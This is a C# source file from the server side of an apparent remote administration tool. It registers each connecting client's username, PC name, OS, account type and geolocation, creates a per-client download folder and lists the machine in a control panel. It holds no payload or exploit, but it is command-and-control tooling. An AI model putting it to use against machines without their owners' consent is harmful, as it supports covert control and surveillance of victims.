using System;
using System.IO;
using System.Windows.Forms;
using xServer.Core.Networking;
using xServer.Core.Packets.ClientPackets;
using xServer.Forms;
using xServer.Settings;

namespace xServer.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE CONNECTION. */
    public static partial class CommandHandler
    {
        public static void HandleInitialize(Client client, Initialize packet)
        {
            if (client.EndPoint.Address.ToString() == "255.255.255.255" || packet.Id.Length != 64)
                return;

            try
            {
                client.Value.Version = packet.Version;
                client.Value.OperatingSystem = packet.OperatingSystem;
                client.Value.AccountType = packet.AccountType;
                client.Value.Country = packet.Country;
                client.Value.CountryCode = packet.CountryCode;
                client.Value.Region = packet.Region;
                client.Value.City = packet.City;
                client.Value.Id = packet.Id;
                client.Value.Username = packet.Username;
                client.Value.PCName = packet.PCName;

                string userAtPc = string.Format("{0}@{1}", client.Value.Username, client.Value.PCName);

                client.Value.DownloadDirectory = (!Helper.Helper.CheckPathForIllegalChars(userAtPc)) ?
                    Path.Combine(Application.StartupPath, string.Format("Clients\\{0}_{1}\\", userAtPc, client.Value.Id.Substring(0, 7))) :
                    Path.Combine(Application.StartupPath, string.Format("Clients\\{0}_{1}\\", client.EndPoint.Address, client.Value.Id.Substring(0, 7)));

                if (!FrmMain.Instance.ListenServer.AllTimeConnectedClients.ContainsKey(client.Value.Id))
                    FrmMain.Instance.ListenServer.AllTimeConnectedClients.Add(client.Value.Id, DateTime.Now);

                string country = string.Format("{0} [{1}]", client.Value.Country, client.Value.CountryCode);

                // this " " leaves some space between the flag-icon and first item
                ListViewItem lvi = new ListViewItem(new string[]
                {
                    " " + client.EndPoint.Address.ToString(), client.EndPoint.Port.ToString(),
                    userAtPc, client.Value.Version, "Connected", "Active", country,
                    client.Value.OperatingSystem, client.Value.AccountType
                }) { Tag = client, ImageIndex = packet.ImageIndex };

                FrmMain.Instance.AddClientToListview(lvi);

                if (XMLSettings.ShowPopup)
                    FrmMain.Instance.ShowPopup(client);

                client.Value.IsAuthenticated = true;
                if (XMLSettings.ShowToolTip)
                    new Packets.ServerPackets.GetSystemInfo().Execute(client);
            }
            catch
            {
            }
        }

        public static void HandleStatus(Client client, Status packet)
        {
            FrmMain.Instance.SetClientStatus(client, packet.Message);
        }

        public static void HandleUserStatus(Client client, UserStatus packet)
        {
            FrmMain.Instance.SetClientUserStatus(client, packet.Message);
        }
    }
}